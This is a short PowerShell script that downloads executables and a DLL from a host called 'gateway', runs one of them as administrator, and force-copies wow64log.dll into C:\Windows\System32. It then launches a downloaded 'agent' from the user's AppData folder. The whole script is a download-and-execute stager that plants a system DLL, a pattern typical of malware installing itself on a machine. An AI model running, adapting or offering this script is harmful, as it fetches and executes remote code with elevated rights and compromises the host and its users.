$gateway = "http://gateway" 

# 1 / Download debug.exe 
$debugUrl = "$gateway/debug.exe"
$debugPath = "$env:APPDATA\agent\debug.exe"
Invoke-WebRequest -Uri $debugUrl -OutFile $debugPath 

# 2 / Run debug.exe as Administrator
Start-Process -FilePath $debugPath -Verb runAs

# 3 / Download wow64log.dll 
$dllUrl = "$gateway/wow64log.dll"
$dllPath = "$env:APPDATA\wow64log.dll"
Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath

# 4 / Move wow64log.dll to System32
$system32Path = "C:\Windows\System32\wow64log.dll"
Copy-Item -Path $dllPath -Destination $system32Path -Force

# 5 / Prepare agent installation  
# 6 / Create %appdata%/agent
$agentFolderPath = "$env:APPDATA\agent"
New-Item -ItemType Directory -Path $agentFolderPath -Force

# 7 / Download agent in %appdata%/agent.exe 
$agentUrl = "$gateway/agent.exe"
$agentPath = "$agentFolderPath\agent.exe"
Invoke-WebRequest -Uri $agentUrl -OutFile $agentPath

# 8 / Run agent.exe
Start-Process -FilePath $agentPath